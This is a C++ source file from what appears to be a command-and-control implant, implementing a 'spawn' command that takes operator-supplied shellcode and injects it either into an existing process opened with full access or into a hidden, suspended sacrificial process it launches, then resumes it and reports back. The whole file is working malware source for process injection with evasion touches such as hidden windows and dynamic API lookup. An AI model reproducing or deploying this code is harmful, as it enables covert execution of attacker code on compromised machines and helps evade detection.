#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_SPAWN

using namespace stardust;
using namespace starburst;

#include <evasion/injection_techniques.h>

auto declfn starburst::cmd_spawn(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    uint32_t pid     = parser_int32( params );
    uint32_t sc_len  = 0;
    auto     sc_data = parser_bytes( params, &sc_len );

    if ( !sc_data || sc_len == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "no shellcode provided" ) ) );
        return;
    }

    HANDLE h_proc    = nullptr;
    HANDLE h_thread  = nullptr;
    uint32_t target_pid = pid;

    if ( pid != 0 ) {
        // inject into existing PID
        h_proc = inst.kernel32.OpenProcess( PROCESS_ALL_ACCESS, FALSE, pid );
        if ( !h_proc ) {
            char msg[80] = { 0 };
            str_copy( msg, symbol<char*>( const_cast<char*>( "OpenProcess failed for PID " ) ) );
            char num[16];
            int_to_str( num, pid, 10 );
            str_concat( msg, num );
            queue_response( inst, task_uuid, RESPONSE_ERROR, msg );
            return;
        }

        h_thread = inject_shellcode( inst, h_proc, sc_data, sc_len );
    } else {
        // spawn sacrifice process using spawnto path
        auto app_path = inst.spawnto.x64;
        auto app_args = inst.spawnto.x64_args;

        if ( !app_path[0] ) {
            queue_response( inst, task_uuid, RESPONSE_ERROR,
                symbol<char*>( const_cast<char*>( "spawnto_x64 not set" ) ) );
            return;
        }

        // build command line: "path args"
        char cmdline_a[600] = { 0 };
        str_copy( cmdline_a, app_path );
        if ( app_args[0] ) {
            str_concat( cmdline_a, symbol<char*>( const_cast<char*>( " " ) ) );
            str_concat( cmdline_a, app_args );
        }

        wchar_t cmdline_w[300] = { 0 };
        inst.kernel32.MultiByteToWideChar( 0, 0, cmdline_a, -1, cmdline_w, 300 );

        STARTUPINFOW si      = {};
        si.cb                = sizeof( STARTUPINFOW );
        si.dwFlags           = 0x101; // STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
        si.wShowWindow       = 0;     // SW_HIDE

        PROCESS_INFORMATION pi = {};
        BOOL ok = inst.kernel32.CreateProcessW(
            nullptr, cmdline_w, nullptr, nullptr, FALSE,
            0x04 | 0x08000000,  // CREATE_SUSPENDED | CREATE_NO_WINDOW
            nullptr, nullptr, &si, &pi );

        if ( !ok ) {
            char msg[340] = { 0 };
            str_copy( msg, symbol<char*>( const_cast<char*>( "CreateProcess failed for: " ) ) );
            str_concat( msg, cmdline_a );
            queue_response( inst, task_uuid, RESPONSE_ERROR, msg );
            return;
        }

        target_pid = static_cast<uint32_t>( pi.dwProcessId );
        h_proc     = pi.hProcess;

        h_thread = inject_shellcode( inst, h_proc, sc_data, sc_len );

        if ( !h_thread ) {
            inst.kernel32.TerminateProcess( pi.hProcess, 1 );
            inst.kernel32.CloseHandle( pi.hThread );
            inst.kernel32.CloseHandle( pi.hProcess );
            queue_response( inst, task_uuid, RESPONSE_ERROR,
                symbol<char*>( const_cast<char*>( "injection into spawned process failed" ) ) );
            return;
        }

        // resume main thread so process stays alive after injection
        typedef DWORD ( WINAPI *fn_ResumeThread )( HANDLE );
        auto pResumeThread = reinterpret_cast<fn_ResumeThread>(
            inst.kernel32.GetProcAddress(
                (HMODULE)inst.kernel32.handle,
                symbol<LPCSTR>( "ResumeThread" ) ) );
        if ( pResumeThread ) {
            pResumeThread( pi.hThread );
        }

        inst.kernel32.CloseHandle( pi.hThread );
    }

    if ( !h_thread ) {
        inst.kernel32.CloseHandle( h_proc );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "injection failed" ) ) );
        return;
    }

    inst.kernel32.CloseHandle( h_thread );
    inst.kernel32.CloseHandle( h_proc );

    char msg[120] = { 0 };
    str_copy( msg, symbol<char*>( const_cast<char*>( "injected " ) ) );
    char num[16];
    int_to_str( num, sc_len, 10 );
    str_concat( msg, num );
    str_concat( msg, symbol<char*>( const_cast<char*>( " bytes into PID " ) ) );
    int_to_str( num, target_pid, 10 );
    str_concat( msg, num );

    queue_response( inst, task_uuid, RESPONSE_SUCCESS, msg );
}

#endif
